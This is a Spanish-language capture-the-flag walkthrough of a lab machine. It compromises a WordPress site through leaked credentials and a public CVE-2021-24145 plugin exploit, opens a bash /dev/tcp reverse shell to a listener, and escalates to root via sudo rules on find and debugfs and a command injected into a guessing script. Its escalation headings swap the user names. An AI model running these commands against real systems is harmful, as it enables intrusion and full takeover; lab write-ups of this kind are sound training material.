## Reconocimiento:

Puerto 80 : HTTP

Hago un fuzzeo de directorios:

```bash
gobuster dir -u http://172.17.0.2/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Encuentro un directorio llamado /backups y dentro hay un archivo zip con un archivo dentro, una vez descargado y descomprimido el contenido es:

```bash
developer | 2wmy3KrGDRD%RsA7Ty5n71L^
```

Encuentro el mismo usuario en WordPress y accedo a la web 

```bash
wpscan --url http://172.17.0.2/ -e u
```

Dentro hay un plugin llamado “modern-events-calendar-lite”, el cual tiene un exploit:

https://github.com/Hacker5preme/Exploits/tree/main/Wordpress/CVE-2021-24145

Lo ejecuto con las credenciales obtenidas:

```bash
python3 exploit.py -T 172.17.0.2 -P 80 -U / -u developer -p 2wmy3KrGDRD%RsA7Ty5n71L^
```

Nos da una URL para acceder a una shell:

```bash
http://172.17.0.2/wp-content/uploads/shell.php
```

Dentro nos enviamos una conexión a nuestra terminal y procedo al tratamiento TTY:

Desde nuestra maquina:

```bash
nc -lvnp 4444
```

Desde la shell:

```bash
bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'
```

## Escalada www-data → ruben

```bash
sudo -l
(rafa) NOPASSWD: /usr/bin/find
```

Busco en Gtfo bins:

```bash
sudo -u rafa find . -exec /bin/bash \; -quit
```

## Escalada ruben → rafa

```bash
sudo -l
(ruben) NOPASSWD: /usr/sbin/debugfs
```

Gtfo bins back again:

```bash
sudo -u ruben debugfs
!/bin/bash
```

## Escalada rafa → root

```bash
sudo -l
(ALL) NOPASSWD: /bin/bash /opt/penguin.sh
```

Es un script que si insertas 47 el output es “correct” pero cualquier otro numero es “incorrect”. 

El exploit es insertar un código que le de permisos SUID  al binario bash.

```bash
Enter guess: prueba[$(chmod u+s /bin/bash >&2)]+42
```

Comprobando vemos que se ejecuta correctamente:

```bash
ls -la /bin/bash
bash -p
```

Listo
